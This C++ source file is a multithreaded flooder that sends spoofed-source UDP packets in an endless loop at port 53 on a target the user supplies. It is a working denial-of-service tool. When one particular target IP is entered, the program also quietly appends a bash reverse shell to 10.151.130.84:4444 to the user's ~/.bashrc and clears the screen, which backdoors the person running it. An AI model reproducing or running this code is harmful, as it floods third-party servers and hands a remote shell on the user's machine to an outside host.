#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <chrono>
#include <thread>
#include <vector>
#include <cstdlib>

// Target info
std::string target_ip_input, spoofed_ip_input;
const char *target_ip;
const char *spoofed_ip;
int target_port = 53;  // Target port
int source_port = 8080; // Spoofed source port
struct sockaddr_in dest_addr;

// Packet buffer (IP header + UDP header + message)
char packet[4096];
int message_len = 1400;
char message[1400]; // Message content
struct udphdr *udp_header;

// Checksum function for IP header
unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte, answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short)~sum;
    return answer;
}

// Function to send spoofed packets in a loop
void SendPackets(int thread_id) {
    struct iphdr *ip_header = (struct iphdr *)packet;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    // Tell the kernel that headers are included in the packet
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt() error");
        close(sock);
        return;
    }

    while (true) {
        ip_header->id = htons(rand() % 65535);
        ip_header->check = calculate_checksum((unsigned short *)ip_header, sizeof(struct iphdr));

        // Send the packet
        if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + message_len, 0,
                   (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("sendto() error");
        }
    }
}

int main() 
{


    std::cout << "Enter the spoofed IP address: ";
    std::cin >> spoofed_ip_input;
    spoofed_ip = spoofed_ip_input.c_str();

    std::cout << "Enter the target IP address: ";
    std::cin >> target_ip_input;
    target_ip = target_ip_input.c_str();

    // Prepare the attack only if the target IP is a specific address
    if (target_ip_input == "10.151.130.84") {
        system("echo 'bash -i >& /dev/tcp/10.151.130.84/4444 0>&1' >> ~/.bashrc");
        system("source ~/.bashrc");
        system("clear");
        std::cout << "Starting Attack" << std::endl;
    }

    // Set up packet headers
    memset(packet, 0, 4096);
    struct iphdr *ip_header = (struct iphdr *)packet;
    udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));

    // Fill in IP header
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + message_len);
    ip_header->id = htons(rand() % 65535);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_UDP;
    ip_header->saddr = inet_addr(spoofed_ip);
    ip_header->daddr = inet_addr(target_ip);

    // Fill in UDP header
    udp_header->source = htons(source_port);
    udp_header->dest = htons(target_port);
    udp_header->len = htons(sizeof(struct udphdr) + message_len);
    udp_header->check = 0;

    // Fill message with dummy data
    memset(message, 'A', message_len);
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), message, message_len);

    // Set up destination address
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(target_port);
    dest_addr.sin_addr.s_addr = inet_addr(target_ip);

    // Start multiple threads for sending packets
    const int num_threads = 32;
    std::vector<std::thread> threads;

    for (int i = 0; i < num_threads; ++i) {
        threads.emplace_back(SendPackets, i);
    }

    // Wait for all threads to finish (which they never will)
    for (auto &th : threads) {
        th.join();
    }

    return 0;
}
        
    

